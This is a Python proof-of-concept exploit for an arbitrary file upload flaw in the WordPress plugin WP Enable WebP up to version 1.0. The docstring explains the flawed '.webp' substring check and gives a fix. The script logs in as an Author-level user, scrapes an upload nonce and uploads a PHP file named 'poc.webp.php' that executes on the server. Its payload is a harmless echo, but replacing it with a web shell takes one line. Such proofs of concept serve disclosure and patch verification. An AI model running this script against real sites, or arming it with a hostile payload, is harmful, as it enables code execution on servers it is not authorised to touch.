#!/usr/bin/env python3
"""
WP Enable WebP <= 1.0 - Arbitrary File Upload
CWE-434 | Requires: Author role (upload capability)

Vulnerable Code (wp-enable-webp.php):
    if ( false !== strpos( $filename, '.webp' ) ) {  // Flawed!
        $types['ext'] = 'webp';
        $types['type'] = 'image/webp';
    }

Fix: Use pathinfo($filename, PATHINFO_EXTENSION) === 'webp'

Usage: python poc.py <url> <username> <password>
"""

import re
import sys
import requests
from urllib.parse import urljoin

def exploit(url, user, pwd):
    s = requests.Session()
    
    # Login
    s.post(urljoin(url, "wp-login.php"), data={
        "log": user, "pwd": pwd, "wp-submit": "Log In",
        "redirect_to": urljoin(url, "wp-admin/"), "testcookie": "1"
    })
    
    # Get nonce
    resp = s.get(urljoin(url, "wp-admin/media-new.php"))
    nonce = re.search(r'"_wpnonce":"([^"]+)"', resp.text)
    if not nonce:
        return print("[-] Failed to get nonce")
    
    # Upload test.webp.php (benign content)
    resp = s.post(urljoin(url, "wp-admin/async-upload.php"), 
        files={"async-upload": ("poc.webp.php", b"<?php echo 'POC'; ?>", "image/webp")},
        data={"_wpnonce": nonce.group(1), "action": "upload-attachment"})
    
    try:
        data = resp.json()
        if data.get("success"):
            print(f"[+] Uploaded: {data['data']['url']}")
        else:
            print(f"[-] Blocked: {data.get('data', {}).get('message', 'Unknown')}")
    except:
        print(f"[-] Error: {resp.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit("Usage: python poc.py <url> <user> <pass>")
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
